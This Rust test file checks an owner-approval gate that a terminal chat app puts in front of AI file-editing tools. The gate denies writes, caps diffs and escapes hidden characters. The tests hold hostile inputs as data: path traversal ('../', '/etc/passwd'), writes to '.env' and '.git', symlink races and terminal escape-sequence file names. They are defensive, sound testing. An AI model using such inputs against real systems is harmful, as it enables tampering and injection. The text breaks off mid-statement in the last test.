//! Issue #235: mutating chat tools pause for owner Approval; denied actions never
//! touch disk; outcomes go to a bounded chat-approval log shown in F4 activity,
//! never to the task store.
mod ollama_fixture;

use alfredo_tui::{
    activity,
    chat_tools::{
        self,
        approval::{self, CardKind, Decision, Gate, Log, Outcome},
        Tier, TOOLS,
    },
    model::{App, Event, Message, Session, Status, ToolCall, Update},
    provider::Ollama,
    tasks::TaskStore,
    ui,
};
use ollama_fixture::{done, Reply};
use ratatui::{backend::TestBackend, Terminal};
use serde_json::json;
use std::{
    fs,
    path::{Path, PathBuf},
    sync::{
        atomic::{AtomicU64, Ordering},
        Arc, Mutex,
    },
    time::{Duration, Instant},
};
use tokio::sync::mpsc;

static ID: AtomicU64 = AtomicU64::new(0);

const README: &str = "# Demo\nOld intro line.\nKeep this line.\n";

fn workspace(tag: &str) -> PathBuf {
    let root = std::env::temp_dir().join(format!(
        "alfredo-approval-{tag}-{}-{}",
        std::process::id(),
        ID.fetch_add(1, Ordering::Relaxed)
    ));
    let _ = fs::remove_dir_all(&root);
    fs::create_dir_all(&root).unwrap();
    fs::write(root.join("README.md"), README).unwrap();
    root
}

fn tool_call(name: &str, arguments: serde_json::Value) -> Reply {
    Reply::Stream(
        vec![
            format!(
                "{}\n",
                json!({"message":{"role":"assistant","content":"","tool_calls":[{"function":{"name":name,"arguments":arguments}}]},"done":false})
            )
            .into_bytes(),
            format!("{}\n", json!({"message":{"content":""},"done":true})).into_bytes(),
        ],
        Duration::ZERO,
    )
}

fn call(name: &str, arguments: serde_json::Value) -> ToolCall {
    ToolCall {
        name: name.into(),
        arguments,
    }
}

/// A gate answering every request with `decision` (None drops the reply, as Esc does).
fn gate(decision: Option<Decision>) -> (Gate, Arc<Mutex<Vec<approval::Card>>>) {
    gate_with(decision, None, || {})
}

/// As [`gate`], logging outcomes to `log` and running `before` ahead of the answer.
fn gate_with(
    decision: Option<Decision>,
    log: Option<Log>,
    before: impl Fn() + Send + 'static,
) -> (Gate, Arc<Mutex<Vec<approval::Card>>>) {
    let (sender, mut receiver) = mpsc::channel::<approval::Request>(4);
    let seen = Arc::new(Mutex::new(Vec::new()));
    let cards = seen.clone();
    tokio::spawn(async move {
        while let Some(request) = receiver.recv().await {
            cards.lock().unwrap().push(request.card.clone());
            before();
            if let Some(decision) = decision {
                let _ = request.reply.send(decision);
            }
        }
    });
    (Gate::new(sender, log), seen)
}

fn log_dir(tag: &str) -> PathBuf {
    workspace(&format!("log-{tag}"))
}

/// One turn: the model asks for `first`, then answers "done".
async fn turn(root: &Path, first: Reply, gate: Option<Gate>) -> (Session, Vec<serde_json::Value>) {
    let addr = ollama_fixture::reserve();
    let first = Mutex::new(Some(first));
    let fixture = ollama_fixture::serve(addr, move |_, index| {
        if index == 0 {
            first.lock().unwrap().take().unwrap()
        } else {
            done("done")
        }
    });
    let provider = Ollama::new(&fixture.endpoint, Duration::from_secs(5)).unwrap();
    let mut session = Session::new("fixture".into());
    session.insert("redraft README");
    let messages = session.begin().unwrap();
    let (sender, mut receiver) = mpsc::channel::<Event>(256);
    chat_tools::run_turn(
        &provider,
        root,
        0,
        1,
        "fixture".into(),
        messages,
        sender,
        gate,
    )
    .await;
    while let Some(event) = receiver.recv().await {
        session.apply(event.attempt, event.update);
    }
    let bodies = fixture
        .requests
        .lock()
        .unwrap()
        .iter()
        .filter(|r| r.path == "POST /api/chat")
        .map(|r| r.body.clone())
        .collect();
    (session, bodies)
}

fn redraft() -> Reply {
    tool_call(
        "edit_file",
        json!({"path": "README.md", "old_text": "Old intro line.", "new_text": "New intro line."}),
    )
}

#[test]
fn mutating_tools_are_registered_with_the_mutating_tier() {
    for name in ["write_file", "edit_file"] {
        let tool = TOOLS.iter().find(|tool| tool.name == name).unwrap();
        assert_eq!(tool.tier, Tier::Mutating, "{name}");
    }
    let names: Vec<_> = chat_tools::definitions()
        .iter()
        .map(|d| d["function"]["name"].as_str().unwrap().to_string())
        .collect();
    assert!(names.contains(&"edit_file".to_string()));
}

#[tokio::test]
async fn redraft_readme_edits_in_place_after_approval() {
    let root = workspace("approve");
    let (gate, seen) = gate(Some(Decision::Approve));
    let (session, bodies) = turn(&root, redraft(), Some(gate)).await;
    assert_eq!(session.status, Status::Complete);
    assert_eq!(
        fs::read_to_string(root.join("README.md")).unwrap(),
        "# Demo\nNew intro line.\nKeep this line.\n"
    );
    let cards = seen.lock().unwrap();
    assert_eq!(cards.len(), 1);
    assert_eq!(cards[0].tool, "edit_file");
    assert_eq!(cards[0].kind, CardKind::Edit);
    assert!(
        cards[0].preview.contains("-Old intro line."),
        "{}",
        cards[0].preview
    );
    assert!(
        cards[0].preview.contains("+New intro line."),
        "{}",
        cards[0].preview
    );
    assert!(cards[0].summary.contains("README.md"));
    let second = bodies[1]["messages"].as_array().unwrap();
    let result = second.last().unwrap();
    assert_eq!(result["role"], "tool");
    assert!(!result["content"].as_str().unwrap().starts_with("error"));
    let _ = fs::remove_dir_all(root);
}

#[tokio::test]
async fn a_denied_action_never_touches_disk_and_the_model_gets_a_refusal() {
    let root = workspace("deny");
    let (gate, seen) = gate(Some(Decision::Deny));
    let (session, bodies) = turn(&root, redraft(), Some(gate)).await;
    assert_eq!(session.status, Status::Complete);
    assert_eq!(fs::read_to_string(root.join("README.md")).unwrap(), README);
    assert_eq!(seen.lock().unwrap().len(), 1);
    let result = &session.tool_steps(1)[0].results[0];
    assert!(result.contains("denied"), "{result}");
    let second = bodies[1]["messages"].as_array().unwrap();
    assert!(second.last().unwrap()["content"]
        .as_str()
        .unwrap()
        .contains("denied"));
    let _ = fs::remove_dir_all(root);
}

#[tokio::test]
async fn a_dropped_decision_counts_as_denial() {
    let root = workspace("drop");
    let (gate, _) = gate(None);
    let (_, _) = turn(&root, redraft(), Some(gate)).await;
    assert_eq!(fs::read_to_string(root.join("README.md")).unwrap(), README);
    let _ = fs::remove_dir_all(root);
}

#[tokio::test]
async fn without_a_gate_mutating_calls_are_refused() {
    let root = workspace("nogate");
    let (session, _) = turn(&root, redraft(), None).await;
    assert_eq!(fs::read_to_string(root.join("README.md")).unwrap(), README);
    assert!(session.tool_steps(1)[0].results[0].starts_with("error: "));
    let _ = fs::remove_dir_all(root);
}

#[tokio::test]
async fn invalid_edits_are_refused_before_asking() {
    for (tag, arguments) in [
        (
            "zero",
            json!({"path": "README.md", "old_text": "absent", "new_text": "x"}),
        ),
        (
            "ambiguous",
            json!({"path": "README.md", "old_text": "line", "new_text": "x"}),
        ),
        (
            "escape",
            json!({"path": "../outside.md", "old_text": "a", "new_text": "b"}),
        ),
        (
            "secret",
            json!({"path": ".env", "old_text": "a", "new_text": "b"}),
        ),
        (
            "identical",
            json!({"path": "README.md", "old_text": "Old intro line.", "new_text": "Old intro line."}),
        ),
    ] {
        let root = workspace(tag);
        fs::write(root.join(".env"), "a\n").unwrap();
        let (gate, seen) = gate(Some(Decision::Approve));
        let (session, _) = turn(&root, tool_call("edit_file", arguments), Some(gate)).await;
        assert!(seen.lock().unwrap().is_empty(), "{tag} asked");
        assert!(
            session.tool_steps(1)[0].results[0].starts_with("error: "),
            "{tag}"
        );
        assert_eq!(fs::read_to_string(root.join("README.md")).unwrap(), README);
        assert_eq!(fs::read_to_string(root.join(".env")).unwrap(), "a\n");
        let _ = fs::remove_dir_all(root);
    }
}

/// Issue #272: write_file under missing directories lists them on the card, creates
/// them on approval, and refuses unsafe ancestors before asking.
#[test]
fn write_file_creates_new_directories_after_a_card_that_lists_them() {
    let root = workspace("newdirs");
    let new = call(
        "write_file",
        json!({"path": "src/util/deep/mod.rs", "content": "pub fn x() {}\n"}),
    );
    let card = approval::card(&root, &new).unwrap();
    assert!(
        card.summary
            .contains("new directories: src, src/util, src/util/deep"),
        "{}",
        card.summary
    );
    assert!(card
        .preview
        .starts_with("new directories: src, src/util, src/util/deep"));
    assert!(!root.join("src").exists(), "preview never creates");
    approval::apply(&root, &card).unwrap();
    assert_eq!(
        fs::read_to_string(root.join("src/util/deep/mod.rs")).unwrap(),
        "pub fn x() {}\n"
    );
    // Only the missing level is listed when part of the path exists.
    let card = approval::card(
        &root,
        &call(
            "write_file",
            json!({"path": "src/util/b/c.rs", "content": "x\n"}),
        ),
    )
    .unwrap();
    assert!(
        card.summary.ends_with("(new directories: src/util/b)"),
        "{}",
        card.summary
    );
    let _ = fs::remove_dir_all(root);
}

#[test]
fn write_file_refuses_unsafe_missing_parents_before_asking() {
    let root = workspace("newdirs-refused");
    let outside = workspace("newdirs-outside");
    #[cfg(unix)]
    {
        std::os::unix::fs::symlink(&outside, root.join("link")).unwrap();
        std::os::unix::fs::symlink(root.join("nowhere"), root.join("dangling")).unwrap();
    }
    fs::write(root.join("afile"), "x").unwrap();
    for path in [
        "link/x/y.txt",
        "dangling/x/y.txt",
        "afile/x/y.txt",
        ".git/x/y",
        ".GIT/x/y",
        ".Git/x/y",
        "a/.git/y/z",
        "x/.env/y",
        "node_modules/x/y.js",
        "a/target/x/y",
        "../x/y",
        "a/../../x/y",
        "/tmp/x/y",
    ] {
        let card = approval::card(
            &root,
            &call("write_file", json!({"path": path, "content": "x\n"})),
        );
        assert!(card.is_err(), "{path} must be refused before asking");
    }
    assert!(!outside.join("x").exists());
    assert!(!root.join(".git").exists() && !root.join("x").exists() && !root.join("a").exists());
    let _ = fs::remove_dir_all(root);
    let _ = fs::remove_dir_all(outside);
}

/// Issue #313: a path with a control character (ESC, BEL, C1 CSI, line break, tab) is
/// refused before asking by write_file and edit_file, and the error does not echo it raw.
#[test]
fn control_characters_in_edit_paths_are_refused_before_asking() {
    let root = workspace("control-path");
    let existing = "kept\u{1b}]0;x\u{7}.txt";
    fs::write(root.join(existing), "a\n").unwrap();
    for path in [
        "esc\u{1b}]0;PWNED\u{7}name.txt",
        "csi\u{9b}31m.txt",
        "line\nbreak.txt",
        "tab\tname.txt",
        existing,
    ] {
        let write = approval::card(
            &root,
            &call("write_file", json!({"path": path, "content": "x\n"})),
        );
        let edit = approval::card(
            &root,
            &call(
                "edit_file",
                json!({"path": path, "old_text": "a", "new_text": "b"}),
            ),
        );
        for (tool, card) in [("write_file", write), ("edit_file", edit)] {
            let error = card
                .err()
                .unwrap_or_else(|| panic!("{tool} {path:?} must be refused"));
            assert!(!error.chars().any(char::is_control), "{tool}: {error:?}");
        }
    }
    assert_eq!(fs::read(root.join(existing)).unwrap(), b"a\n");
    let names: Vec<_> = fs::read_dir(&root)
        .unwrap()
        .flatten()
        .map(|entry| entry.file_name().to_string_lossy().into_owned())
        .collect();
    assert!(
        names
            .iter()
            .all(|n| !n.contains("name") && !n.contains("break")),
        "{names:?}"
    );
    let _ = fs::remove_dir_all(root);
}

#[test]
fn write_file_new_directories_refuse_when_an_ancestor_changes_after_the_card() {
    for (tag, change) in [("file", 0), ("dir", 1), ("symlink", 2)] {
        let root = workspace(&format!("newdirs-race-{tag}"));
        let outside = workspace(&format!("newdirs-race-out-{tag}"));
        let new = call(
            "write_file",
            json!({"path": "src/util/mod.rs", "content": "x\n"}),
        );
        let card = approval::card(&root, &new).unwrap();
        match change {
            0 => fs::write(root.join("src"), "i am a file").unwrap(),
            1 => fs::create_dir_all(root.join("src")).unwrap(),
            _ => {
                #[cfg(unix)]
                std::os::unix::fs::symlink(&outside, root.join("src")).unwrap();
            }
        }
        let result = approval::apply(&root, &card);
        assert!(result.is_err(), "{tag}: {result:?}");
        assert!(!root.join("src/util").exists(), "{tag}");
        assert!(!outside.join("util").exists(), "{tag}");
        let _ = fs::remove_dir_all(root);
        let _ = fs::remove_dir_all(outside);
    }
}

#[cfg(unix)]
#[test]
fn write_file_does_not_create_directories_in_a_read_only_directory() {
    use std::os::unix::fs::PermissionsExt;
    let root = workspace("newdirs-ro");
    fs::create_dir(root.join("ro")).unwrap();
    fs::set_permissions(root.join("ro"), fs::Permissions::from_mode(0o555)).unwrap();
    let card = approval::card(
        &root,
        &call(
            "write_file",
            json!({"path": "ro/a/b.txt", "content": "x\n"}),
        ),
    );
    fs::set_permissions(root.join("ro"), fs::Permissions::from_mode(0o755)).unwrap();
    assert!(card.is_err(), "read-only anchor refused");
    assert!(!root.join("ro/a").exists());
    let _ = fs::remove_dir_all(root);
}

#[test]
fn write_file_previews_creates_and_refuses_excluded_paths() {
    let root = workspace("write");
    let card = approval::card(
        &root,
        &call(
            "write_file",
            json!({"path": "docs/new.md", "content": "hello\n"}),
        ),
    );
    assert!(card.is_ok(), "missing parent directory gets a card");
    fs::create_dir_all(root.join("docs")).unwrap();
    let new = call(
        "write_file",
        json!({"path": "docs/new.md", "content": "hello\n"}),
    );
    let card = approval::card(&root, &new).unwrap();
    assert!(card.preview.contains("+hello"), "{}", card.preview);
    assert!(card.summary.contains("new file"), "{}", card.summary);
    assert!(!root.join("docs/new.md").exists(), "preview never writes");
    let result = chat_tools::dispatch(&root, &new);
    assert!(!result.starts_with("error"), "{result}");
    assert_eq!(
        fs::read_to_string(root.join("docs/new.md")).unwrap(),
        "hello\n"
    );
    let replace = call(
        "write_file",
        json!({"path": "README.md", "content": "# New\n"}),
    );
    let card = approval::card(&root, &replace).unwrap();
    assert!(card.preview.contains("-Old intro line."));
    assert!(card.preview.contains("+# New"));
    for path in [".env", ".git/config", "/etc/passwd", "a/../../x"] {
        let refused = call("write_file", json!({"path": path, "content": "x"}));
        assert!(approval::card(&root, &refused).is_err(), "{path}");
        assert!(chat_tools::dispatch(&root, &refused).starts_with("error"));
    }
    assert!(!root.join(".env").exists());
    let _ = fs::remove_dir_all(root);
}

#[test]
fn edit_file_matches_lf_old_text_in_a_crlf_file_and_keeps_crlf() {
    let root = workspace("crlf-edit");
    fs::write(root.join("win.txt"), b"one\r\ntwo\r\nthree\r\n").unwrap();
    let edit = call(
        "edit_file",
        json!({"path": "win.txt", "old_text": "one\ntwo", "new_text": "uno\ndos\ndos-b"}),
    );
    let card = approval::card(&root, &edit).unwrap();
    assert!(!card.preview.contains("line endings"), "{}", card.preview);
    let result = chat_tools::dispatch(&root, &edit);
    assert!(!result.starts_with("error"), "{result}");
    assert_eq!(
        fs::read(root.join("win.txt")).unwrap(),
        b"uno\r\ndos\r\ndos-b\r\nthree\r\n"
    );
    let _ = fs::remove_dir_all(root);
}

#[test]
fn edit_file_on_a_mixed_ending_file_matches_exact_bytes() {
    let root = workspace("mixed-edit");
    fs::write(root.join("m.txt"), b"a\r\nb\nc\r\n").unwrap();
    let lf = call(
        "edit_file",
        json!({"path": "m.txt", "old_text": "a\nb", "new_text": "x"}),
    );
    let result = chat_tools::dispatch(&root, &lf);
    assert!(result.contains("mixes CRLF and LF"), "{result}");
    let exact = call(
        "edit_file",
        json!({"path": "m.txt", "old_text": "b\nc", "new_text": "y\nz"}),
    );
    let result = chat_tools::dispatch(&root, &exact);
    assert!(!result.starts_with("error"), "{result}");
    assert_eq!(fs::read(root.join("m.txt")).unwrap(), b"a\r\ny\nz\r\n");
    let _ = fs::remove_dir_all(root);
}

#[test]
fn ending_only_writes_show_an_explicit_card_line_and_keep_the_fingerprint() {
    let root = workspace("ending-card");
    fs::write(root.join("win.txt"), b"one\r\ntwo\r\nthree\r\n").unwrap();
    let lf = call(
        "write_file",
        json!({"path": "win.txt", "content": "one\ntwo\nthree\n"}),
    );
    let card = approval::card(&root, &lf).unwrap();
    assert!(
        card.preview.contains("line endings CRLF \u{2192} LF"),
        "{}",
        card.preview
    );
    assert!(
        !card.preview.contains("no line changes"),
        "{}",
        card.preview
    );
    let bare = call(
        "write_file",
        json!({"path": "win.txt", "content": "one\r\ntwo\r\nthree"}),
    );
    let card = approval::card(&root, &bare).unwrap();
    assert!(
        card.preview.contains("final newline removed"),
        "{}",
        card.preview
    );
    let result = chat_tools::dispatch(&root, &lf);
    assert!(!result.starts_with("error"), "{result}");
    assert_eq!(
        fs::read(root.join("win.txt")).unwrap(),
        b"one\ntwo\nthree\n"
    );
    // Identical content still reports no change.
    let same = approval::card(&root, &lf).unwrap();
    assert!(same.preview.contains("no line changes"), "{}", same.preview);
    let _ = fs::remove_dir_all(root);
}

#[test]
fn edit_file_refuses_identical_new_text_with_clear_error() {
    let root = workspace("edit-identical");
    fs::write(root.join("f.txt"), "a\nb\n").unwrap();
    let edit = call(
        "edit_file",
        json!({"path": "f.txt", "old_text": "b", "new_text": "b"}),
    );
    let card = approval::card(&root, &edit);
    assert_eq!(
        card.unwrap_err(),
        "new_text is identical to old_text; nothing to change"
    );
    let result = chat_tools::dispatch(&root, &edit);
    assert_eq!(
        result,
        "error: new_text is identical to old_text; nothing to change"
    );
    assert_eq!(fs::read_to_string(root.join("f.txt")).unwrap(), "a\nb\n");
    let _ = fs::remove_dir_all(root);
}

#[test]
fn edit_file_refuses_line_ending_only_change_in_crlf_file() {
    let root = workspace("edit-crlf-noop");
    fs::write(root.join("win.txt"), b"a\r\nb\r\n").unwrap();
    let edit = call(
        "edit_file",
        json!({"path": "win.txt", "old_text": "b\r\n", "new_text": "b\n"}),
    );
    let card = approval::card(&root, &edit);
    assert_eq!(
        card.unwrap_err(),
        "edit_file keeps the file's CRLF endings; use write_file to change them"
    );
    let result = chat_tools::dispatch(&root, &edit);
    assert_eq!(
        result,
        "error: edit_file keeps the file's CRLF endings; use write_file to change them"
    );
    assert_eq!(fs::read(root.join("win.txt")).unwrap(), b"a\r\nb\r\n");
    let _ = fs::remove_dir_all(root);
}

/// Issue #269: the card shows the whole diff or the call is refused. The cap counts every
/// line the card diff holds (the `@@` header, `-`/`+` lines, line-ending notes and the
/// `new directories:` line): 80 passes, 81 is refused before any card or write.
fn numbered(count: usize) -> String {
    (1..=count).map(|n| format!("line {n}\n")).collect()
}

#[test]
fn write_file_diff_of_exactly_80_lines_gets_a_whole_card() {
    let root = workspace("cap-write-80");
    // Header + 79 added lines = 80.
    let write = call(
        "write_file",
        json!({"path": "ok.txt", "content": numbered(79)}),
    );
    let card = approval::card(&root, &write).unwrap();
    assert_eq!(card.preview.lines().count(), 80, "{}", card.preview);
    assert!(!card.preview.contains("more"), "{}", card.preview);
    assert!(card.preview.contains("+line 79"), "{}", card.preview);
    approval::apply(&root, &card).unwrap();
    assert_eq!(
        fs::read_to_string(root.join("ok.txt")).unwrap(),
        numbered(79)
    );
    let _ = fs::remove_dir_all(root);
}

#[test]
fn write_file_diff_of_81_lines_is_refused_naming_the_cap_and_writes_nothing() {
    let root = workspace("cap-write-81");
    let write = call(
        "write_file",
        json!({"path": "big.txt", "content": numbered(80)}),
    );
    let error = approval::card(&root, &write).unwrap_err();
    assert!(
        error.contains("81 lines") && error.contains("80-line"),
        "{error}"
    );
    assert!(error.contains("smaller"), "{error}");
    let result = chat_tools::dispatch(&root, &write);
    assert!(
        result.starts_with("error: ") && result.contains("80-line"),
        "{result}"
    );
    assert!(!root.join("big.txt").exists());
    // Replacing an existing file is held to the same cap and left byte-identical.
    fs::write(root.join("old.txt"), numbered(3)).unwrap();
    let replace = call(
        "write_file",
        json!({"path": "old.txt", "content": numbered(200)}),
    );
    assert!(approval::card(&root, &replace)
        .unwrap_err()
        .contains("80-line"));
    assert!(chat_tools::dispatch(&root, &replace).starts_with("error: "));
    assert_eq!(
        fs::read_to_string(root.join("old.txt")).unwrap(),
        numbered(3)
    );
    let _ = fs::remove_dir_all(root);
}

#[test]
fn the_new_directories_line_counts_toward_the_write_file_cap() {
    let root = workspace("cap-write-dirs");
    // new directories line + header + 78 added lines = 80.
    let at_cap = call(
        "write_file",
        json!({"path": "a/b/ok.txt", "content": numbered(78)}),
    );
    let card = approval::card(&root, &at_cap).unwrap();
    assert_eq!(card.preview.lines().count(), 80, "{}", card.preview);
    let over = call(
        "write_file",
        json!({"path": "a/b/big.txt", "content": numbered(79)}),
    );
    assert!(approval::card(&root, &over)
        .unwrap_err()
        .contains("80-line"));
    assert!(chat_tools::dispatch(&root, &over).starts_with("error: "));
    assert!(!root.join("a").exists(), "no directory may be created");
    let _ = fs::remove_dir_all(root);
}

#[test]
fn edit_file_diff_of_exactly_80_lines_passes_and_81_is_refused_unchanged() {
    let root = workspace("cap-edit");
    let old = numbered(40);
    fs::write(root.join("f.txt"), &old).unwrap();
    // Header + 39 removed + 40 added = 80.
    let at_cap = call(
        "edit_file",
        json!({"path": "f.txt", "old_text": &old[..old.len() - "line 40\n".len()],
               "new_text": (1..=40).map(|n| format!("new {n}\n")).collect::<String>()}),
    );
    let card = approval::card(&root, &at_cap).unwrap();
    assert_eq!(card.preview.lines().count(), 80, "{}", card.preview);
    assert!(!card.preview.contains("more"), "{}", card.preview);
    // Header + 40 removed + 40 added = 81.
    let over = call(
        "edit_file",
        json!({"path": "f.txt", "old_text": &old,
               "new_text": (1..=40).map(|n| format!("new {n}\n")).collect::<String>()}),
    );
    let error = approval::card(&root, &over).unwrap_err();
    assert!(
        error.contains("81 lines") && error.contains("80-line"),
        "{error}"
    );
    let result = chat_tools::dispatch(&root, &over);
    assert!(
        result.starts_with("error: ") && result.contains("80-line"),
        "{result}"
    );
    assert_eq!(fs::read(root.join("f.txt")).unwrap(), old.as_bytes());
    let _ = fs::remove_dir_all(root);
}

#[test]
fn a_line_ending_note_counts_toward_the_cap() {
    let root = workspace("cap-note");
    fs::write(root.join("n.txt"), "x").unwrap();
    // Header + `-x` + 77 added = 79, plus "final newline added" = 80.
    let at_cap = call(
        "write_file",
        json!({"path": "n.txt", "content": numbered(77)}),
    );
    assert_eq!(
        approval::card(&root, &at_cap)
            .unwrap()
            .preview
            .lines()
            .count(),
        80
    );
    let over = call(
        "write_file",
        json!({"path": "n.txt", "content": numbered(78)}),
    );
    assert!(approval::card(&root, &over)
        .unwrap_err()
        .contains("80-line"));
    assert_eq!(fs::read_to_string(root.join("n.txt")).unwrap(), "x");
    let _ = fs::remove_dir_all(root);
}

#[test]
fn earlier_refusals_still_win_over_the_diff_cap() {
    let root = workspace("cap-order");
    fs::write(root.join(".env"), "a\n").unwrap();
    let secret = call(
        "write_file",
        json!({"path": ".env", "content": numbered(200)}),
    );
    let error = approval::card(&root, &secret).unwrap_err();
    assert!(!error.contains("80-line"), "{error}");
    let _ = fs::remove_dir_all(root);
}

#[tokio::test]
async fn outcomes_are_logged_after_execution_and_shown_in_activity() {
    let dir = log_dir("outcomes");
    let log = Log::new(&dir);
    let root = workspace("logged");
    let (gate, _) = gate_with(Some(Decision::Deny), Some(log.clone()), || {});
    turn(&root, redraft(), Some(gate)).await;
    // Approved, but the file changed after the preview: logged as failed, not applied.
    let readme = root.join("README.md");
    let (gate, _) = gate_with(Some(Decision::Approve), Some(log.clone()), move || {
        fs::write(&readme, format!("{README}extra\n")).unwrap();
    });
    turn(&root, redraft(), Some(gate)).await;
    let (gate, _) = gate_with(Some(Decision::Approve), Some(log.clone()), || {});
    turn(&root, redraft(), Some(gate)).await;
    let records = log.records();
    let outcomes: Vec<_> = records.iter().map(|r| r.outcome.clone()).collect();
    assert!(matches!(outcomes[0], Outcome::Denied), "{outcomes:?}");
    assert!(matches!(outcomes[1], Outcome::Failed(_)), "{outcomes:?}");
    assert!(matches!(outcomes[2], Outcome::Applied), "{outcomes:?}");
    assert_eq!(records[0].tool, "edit_file");
    assert!(records[0].target.contains("README.md"));
    let entries = activity::chat_entries(&records, "");
    assert!(
        entries[0].summary.contains("applied"),
        "{}",
        entries[0].summary
    );
    assert!(entries[1].summary.contains("failed"));
    assert!(entries[2].summary.contains("denied"));
    assert!(activity::chat_entries(&records, "denied").len() == 1);
    let _ = fs::remove_dir_all(root);
    let _ = fs::remove_dir_all(dir);
}

#[test]
fn the_chat_log_is_bounded_and_never_touches_the_task_store() {
    let base = workspace("bounded");
    fs::create_dir_all(base.join("ws")).unwrap();
    let store = TaskStore::new(&base.join("state"), &base.join("ws"), "approval").unwrap();
    let before = store.snapshot().unwrap();
    let log = Log::for_store(&store).unwrap();
    let card = approval::card(
        &base,
        &call(
            "edit_file",
            json!({"path": "README.md", "old_text": "Old intro line.", "new_text": "N"}),
        ),
    )
    .unwrap();
    for _ in 0..(approval::MAX_LOG * 2 + 10) {
        log.append(&card, &Outcome::Denied);
    }
    let records = log.records();
    assert!(records.len() <= approval::MAX_LOG * 2, "{}", records.len());
    assert!(records.len() >= approval::MAX_LOG);
    let after = store.snapshot().unwrap();
    assert_eq!(after.revision, before.revision);
    assert!(after.receipts.is_empty());
    assert_eq!(after.schema_version, alfredo_tui::tasks::SCHEMA_VERSION);
    assert_eq!(
        alfredo_tui::tasks::SCHEMA_VERSION,
        17,
        "no task schema bump"
    );
    let _ = fs::remove_dir_all(base);
}

#[tokio::test]
async fn a_file_changed_after_the_preview_is_refused_at_approval() {
    for (tag, first) in [
        ("toctou-edit", redraft()),
        (
            "toctou-write",
            tool_call(
                "write_file",
                json!({"path": "README.md", "content": "# Replaced\n"}),
            ),
        ),
    ] {
        let root = workspace(tag);
        let target = root.join("README.md");
        let changed = "# Demo\nOld intro line.\nKeep this line.\nOwner added this.\n";
        let (gate, _) = gate_with(Some(Decision::Approve), None, move || {
            fs::write(&target, changed).unwrap();
        });
        let (session, _) = turn(&root, first, Some(gate)).await;
        let result = &session.tool_steps(1)[0].results[0];
        assert!(result.contains("changed since"), "{tag}: {result}");
        assert_eq!(fs::read_to_string(root.join("README.md")).unwrap(), changed);
        let _ = fs::remove_dir_all(root);
    }
}

fn pending_session() -> Session {
    let root = workspace("card");
    let card = approval::card(
        &root,
        &call(
            "edit_file",
            json!({"path": "README.md", "old_text": "Old intro line.", "new_text": "New intro line."}),
        ),
    )
    .unwrap();
    let _ = fs::remove_dir_all(root);
    let mut session = Session::new("m".into());
    session.insert("redraft README");
    session.begin().unwrap();
    let attempt = session.attempt;
    session.apply(attempt, Update::Admitted);
    let now = Instant::now();
    assert!(
        !session.await_approval(attempt + 1, card.clone(), now),
        "stale"
    );
    assert!(session.await_approval(attempt, card, now));
    // Stands in for a draw that showed the whole card (issue #303).
    session.set_approval_whole(true);
    session.approval_visible(true, now);
    session
}

#[test]
fn the_pending_card_shows_tool_args_diff_and_keys() {
    let mut app = App::new("m".into());
    app.sessions[0] = pending_session();
    let mut terminal = Terminal::new(TestBackend::new(120, 40)).unwrap();
    terminal.draw(|frame| ui::draw(frame, &app)).unwrap();
    let text: String = terminal
        .backend()
        .buffer()
        .content()
        .iter()
        .map(|cell| cell.symbol())
        .collect();
    assert!(text.contains("Approve edit_file"), "{text}");
    assert!(text.contains("README.md"));
    assert!(text.contains("-Old intro line."));
    assert!(text.contains("+New intro line."));
    assert!(text.contains("y approve"));
    assert!(text.contains("n deny"));
}

/// A pending edit card for `content` in `file`, drawn at 120x40 (issue #404).
fn edit_card_screen(file: &str, content: &str, old: &str, new: &str) -> String {
    let root = workspace("tabs");
    fs::write(root.join(file), content).unwrap();
    let edit = call(
        "edit_file",
        json!({"path": file, "old_text": old, "new_text": new}),
    );
    card_screen(root, &edit)
}

fn card_screen(root: PathBuf, tool: &ToolCall) -> String {
    let card = approval::card(&root, tool).unwrap();
    let _ = fs::remove_dir_all(root);
    let mut session = Session::new("m".into());
    session.insert("fix it");
    session.begin().unwrap();
    let attempt = session.attempt;
    session.apply(attempt, Update::Admitted);
    let now = Instant::now();
    assert!(session.await_approval(attempt, card, now));
    session.approval_visible(true, now);
    let mut app = App::new("m".into());
    app.sessions[0] = session;
    let mut terminal = Terminal::new(TestBackend::new(120, 40)).unwrap();
    terminal.draw(|frame| ui::draw(frame, &app)).unwrap();
    assert!(
        !terminal
            .backend()
            .buffer()
            .content()
            .iter()
            .any(|cell| cell.symbol().contains('\t')),
        "a raw tab reached the terminal buffer"
    );
    screen(&terminal)
}

/// Issue #404: a tab shows as an arrow plus padding to the next 4-column stop, so a
/// tab to spaces edit never renders two identical `-`/`+` lines.
#[test]
fn a_tab_to_spaces_edit_card_shows_different_removed_and_added_lines() {
    let text = edit_card_screen("Makefile", "all:\n\techo hi\n", "\techo hi", "    echo hi");
    assert!(text.contains("-→  echo hi"), "{text}");
    assert!(text.contains("+    echo hi"), "{text}");
    let text = edit_card_screen("data.tsv", "id\tname\n1\talice\n", "1\talice", "1alice");
    assert!(text.contains("-1→ alice"), "{text}");
    assert!(text.contains("+1alice"), "{text}");
}

/// Issue #404: the line-ending note keeps its real arrow; only diff lines escape one.
#[test]
fn the_line_ending_note_keeps_its_arrow_on_the_card() {
    let root = workspace("ending-note");
    fs::write(root.join("win.txt"), b"one\r\ntwo\r\n").unwrap();
    let lf = call(
        "write_file",
        json!({"path": "win.txt", "content": "one\ntwo\n"}),
    );
    let text = card_screen(root, &lf);
    assert!(text.contains("line endings CRLF → LF"), "{text}");
    assert!(!text.contains("<U+2192>"), "{text}");
}

/// Issue #404: a file that really contains the arrow cannot pass for a tab.
#[test]
fn a_literal_arrow_cannot_pass_for_a_tab_on_the_card() {
    let text = edit_card_screen("a.txt", "a\tb\n", "a\tb", "a→  b");
    assert!(text.contains("-a→ b"), "{text}");
    assert!(text.contains("+a<U+2192>  b"), "{text}");
}

/// Issue #404: tab-indented code keeps its indent and the card's `args` line still
/// shows the escaped `\t`; hidden characters still show as `<U+XXXX>`.
#[test]
fn tab_indented_card_lines_keep_their_indent_and_args_stay_escaped() {
    let text = edit_card_screen("main.go", "\tif x {\n", "\tif x {", "\tif y\u{202e} {");
    assert!(text.contains("-→  if x {"), "{text}");
    assert!(text.contains("+→  if y<U+202E> {"), "{text}");
    assert!(text.contains("\"old_text\":\"\\tif x {\""), "{text}");
    assert!(!text.contains('\u{202e}'), "{text}");
}

/// Issue #510: a rewrite with two distant changes shows both hunks, only the changed
/// lines, hidden characters escaped as before, and applies exactly the previewed bytes.
#[test]
fn a_scattered_rewrite_card_shows_minimal_hunks_and_applies_the_previewed_bytes() {
    let root = workspace("minimal-hunks");
    let old: String = (1..=100).map(|n| format!("x{n}\n")).collect();
    let new = old
